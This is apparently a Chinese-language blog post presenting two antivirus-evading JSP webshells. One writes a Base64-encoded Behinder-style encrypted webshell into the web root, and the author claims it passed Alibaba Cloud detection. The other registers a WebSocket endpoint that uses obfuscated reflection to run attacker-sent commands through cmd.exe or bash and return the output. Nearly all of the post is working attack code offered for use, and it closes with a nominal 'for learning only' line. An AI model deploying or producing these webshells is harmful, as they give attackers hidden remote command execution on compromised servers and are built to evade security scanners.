冰蝎，哥斯拉，有可能落地就被查杀，这两者的特征方式太过于明显，这篇文章主要是讲两个免杀，一个是动态写入文件，一个是websocket  
其实动态写入比较简单，会有痕迹，不管以反序列化，还是上传，或者是通过Invoke方法调用该类，都会动态的在项目里面生成一个临时的jsp文件

    
    
    <%@ page import="java.nio.file.Files" %>
    <%@ page import="java.nio.file.Paths" %>
    <%@ page import="java.net.URLClassLoader" %>
    <%@ page import="java.net.URL" %>
    <%@ page import="java.util.Base64" %>
    <%@ page import="java.io.File" %>
    <%@ page import="java.util.Objects" %>
    <%
    %>
    <%
        String className = "myshell";
        byte[] bytes = Base64.getDecoder().decode("PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiICU+DQo8JSENCiAgICBjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXIgew0KICAgICAgICBVKENsYXNzTG9hZGVyIGMpIHsNCiAgICAgICAgICAgIHN1cGVyKGMpOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIENsYXNzIGcoYnl0ZVtdIGIpIHsNCiAgICAgICAgICAgIHJldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLCAwLCBiLmxlbmd0aCk7DQogICAgICAgIH0NCiAgICB9DQolPg0KDQo8JQ0KICAgIGlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKSB7DQogICAgICAgIFN0cmluZyBrID0gImU0NWUzMjlmZWI1ZDkyNWIiOy8q6K+l5a+G6ZKl5Li66L+e5o6l5a+G56CBMzLkvY1tZDXlgLznmoTliY0xNuS9je+8jOm7mOiupOi/nuaOpeWvhueggXJlYmV5b25kKi8NCiAgICAgICAgc2Vzc2lvbi5wdXRWYWx1ZSgidSIsIGspOw0KICAgICAgICBDaXBoZXIgYyA9IENpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7DQogICAgICAgIGMuaW5pdCgyLCBuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksICJBRVMiKSk7DQogICAgICAgIG5ldyBVKHRoaXMuZ2V0Q2xhc3MoKS5nZXRDbGFzc0xvYWRlcigpKS5nKA0KICAgICAgICAgICAgICAgICAgICAgICAgYy5kb0ZpbmFsKG5ldyBzdW4ubWlzYy5CQVNFNjREZWNvZGVyKCkuZGVjb2RlQnVmZmVyKHJlcXVlc3QuZ2V0UmVhZGVyKCkucmVhZExpbmUoKSkpKQ0KICAgICAgICAgICAgICAgIC5uZXdJbnN0YW5jZSgpLmVxdWFscyhwYWdlQ29udGV4dCk7DQogICAgfQ0KJT4=");
        File file = new File(request.getServletContext().getRealPath("/"));
        file.mkdirs();
        Files.write(Paths.get(file.getAbsolutePath() + "/" + className + ".jsp"),bytes);
    %>
    

它主要做的就是通过字节的方式在虚拟机中创建一个临时的jsp文件，对于本地来说是无法查实的，对于日志来说只能看见访问路径，但看不见源代码，重启项目是会消失，在其可以对其进行一个随机数的处理，这是以前写的马，在下面可以增加一个file.remove的方法，进行文件的删除，类似于启动后自毁，缺点是如果是集成环境下，有可能找不到该路径，中间的字节方式可以自己生成一个自定义的马，进行套娃。  
![](./img/6224293513737261743.png)  
已过了阿里云的检测。

第二个是关于websocket的，先贴源码

    
    
    <%@ page import="javax.websocket.server.ServerEndpointConfig" %>
    <%@ page import="javax.websocket.server.ServerContainer" %>
    <%@ page import="javax.websocket.*" %>
    <%@ page import="java.io.*" %>
    <%@ page import="java.util.HashMap" %>
    <%@ page import="java.util.Base64" %>
    <%@ page import="sun.misc.BASE64Decoder" %>
    <%@ page import="java.lang.reflect.Method" %>
    <%@ page import="java.util.Objects" %>
    <%@ page import="sun.misc.BASE64Encoder" %>
    
    <%!
        public static class C extends Endpoint implements MessageHandler.Whole<String> {
            private Session session;
            @Override
            public void onMessage(String s) {
                try {
                    HashMap<Integer,String> hashMap=new HashMap<>();
                    hashMap.put(46,".");
                    hashMap.put(65,"A");
                    hashMap.put(66,"B");hashMap.put(67,"C");hashMap.put(68,"D");hashMap.put(69,"E");hashMap.put(70,"F");
                    hashMap.put(71,"G");hashMap.put(72,"H");hashMap.put(73,"I");hashMap.put(74,"J");hashMap.put(75,"K");
                    hashMap.put(76,"L");hashMap.put(77,"M");hashMap.put(78,"N");hashMap.put(79,"O");hashMap.put(80,"P");
                    hashMap.put(81,"Q");hashMap.put(82,"R");hashMap.put(83,"S");hashMap.put(84,"T");hashMap.put(85,"U");
                    hashMap.put(86,"V");hashMap.put(87,"W");hashMap.put(88,"X");hashMap.put(89,"Y");hashMap.put(90,"Z");
                    hashMap.put(97,"a");
                    hashMap.put(98,"b");hashMap.put(99,"c");hashMap.put(100,"d");hashMap.put(101,"e");hashMap.put(102,"f");
                    hashMap.put(103,"g");hashMap.put(104,"h");hashMap.put(105,"i");hashMap.put(106,"j");hashMap.put(107,"k");
                    hashMap.put(108,"l");hashMap.put(109,"m");hashMap.put(110,"n");hashMap.put(111,"o");hashMap.put(112,"p");
                    hashMap.put(113,"q");hashMap.put(114,"r");hashMap.put(115,"s");hashMap.put(116,"t");hashMap.put(117,"u");
                    hashMap.put(118,"v");hashMap.put(119,"w");hashMap.put(120,"x");hashMap.put(121,"y");hashMap.put(122,"z");
                    BASE64Decoder decoder=new BASE64Decoder();
                    BASE64Encoder encoder=new BASE64Encoder();
                    Process process;
                    boolean bool = System.getProperty("os.name").toLowerCase().startsWith("windows");
                    if (bool) {
                        Class cl=Class.forName(new String(decoder.decodeBuffer("anphenZhei5sYXpuZ3ouelJ6dXpudGl6bWV6enp6enp6eno="),"UTF-8").replace("z",""));
                        Method ex=cl.getMethod(new String(decoder.decodeBuffer("ZXhlYw==")),String.class);
                        Method get=cl.getMethod(new String(decoder.decodeBuffer("Z3p6emV0enp6enpSenp6dW50eml6em16enpleg=="),"GBK").replace("z",""));
                        Object go=get.invoke(cl);
                        process= (Process) ex.invoke(go,new String(decoder.decodeBuffer("Y21kLmV4ZSAvYyA="))+s);
                    } else {
                        Class cl=Class.forName(new String(decoder.decodeBuffer("anphenZhei5sYXpuZ3ouelJ6dXpudGl6bWV6enp6enp6eno="),"UTF-8").replace("z",""));
                        Method ex=cl.getMethod(new String(decoder.decodeBuffer("ZXhlYw==")),String.class);
                        Method get=cl.getMethod(new String(decoder.decodeBuffer("Z3p6emV0enp6enpSenp6dW50eml6em16enpleg=="),"GBK").replace("z",""));
                        Object go=get.invoke(cl);
                        process= (Process) ex.invoke(go,new String(decoder.decodeBuffer("L2Jpbi9iYXNoIC1jIA=="))+s);
                    }
                    InputStream inputStream = process.getInputStream();
                    StringBuilder stringBuilder = new StringBuilder();
                    int i;
                    while ((i = inputStream.read()) != -1)
                        stringBuilder.append((char)i);
                    inputStream.close();
                    process.waitFor();
                    System.out.println(s);
                    System.out.println(stringBuilder.toString());
                    session.getBasicRemote().sendText(encoder.encode(stringBuilder.toString().getBytes()));
                } catch (Exception exception) {
                    exception.printStackTrace();
                }
            }
            @Override
            public void onOpen(final Session session, EndpointConfig config) {
                this.session = session;
                session.addMessageHandler(this);
            }
        }
    %>
    
    <%
        String path = request.getParameter("id");
        ServletContext servletContext = request.getSession().getServletContext();
        ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(C.class, path).build();
        ServerContainer container = (ServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
        try {
            if (servletContext.getAttribute(path) == null){
                container.addEndpoint(configEndpoint);
                servletContext.setAttribute(path,path);
            }
        } catch (Exception e) {
        }
    %>
    

包,Endpoint是用于websocket的编写，javax自带,过得了大部分的免杀，阿里的没过，其中包含动态反射能够远程命令执行，好处是任意人都可以通过在线工具去链接，通过反射进行的远程命令执行  
这是基础的命令执行

    
    
    ProcessBuilder processBuilder = new ProcessBuilder("cmd.exe", "/c", command);
        processBuilder.redirectErrorStream(true);
        Process process = processBuilder.start();
        process.waitFor();
    

仅作为学习使用

